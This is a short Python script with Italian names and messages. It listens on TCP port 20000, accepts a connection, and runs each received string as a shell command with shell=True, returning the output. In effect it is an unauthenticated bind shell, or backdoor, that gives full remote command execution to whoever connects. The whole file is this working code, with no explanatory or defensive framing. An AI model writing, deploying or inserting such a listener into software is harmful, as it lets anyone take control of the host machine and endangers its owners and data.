import socket
import subprocess

def ricevi_comandi(conn):
    while True:
        richiesta = conn.recv(4096)
        risposta = subprocess.run(richiesta.decode(), 
                                  shell=True, 
                                  stdout=subprocess.PIPE, 
                                  stderr=subprocess.PIPE)
        data = risposta.stdout + risposta.stderr
        conn.sendall(data)


def sub_server(indirizzo, backlog=1):
    try:
        s = socket.socket()                    
        s.bind(indirizzo)                     
        s.listen(backlog)                     
        print("Server Inizializzato. In ascolto...")
    except socket.error as errore:
        print(f"Qualcosa è andato storto... \n{errore}")
        print(f"Sto tentando di reinizializzare il server...")
        sub_server(indirizzo, backlog=1)
    conn, indirizzo_client = s.accept() # conn = socket_client
    print(f"Connessione Server - Client Stabilita: {indirizzo_client}")
    ricevi_comandi(conn)

if __name__ == '__main__':
    sub_server(("insert-address", 20000))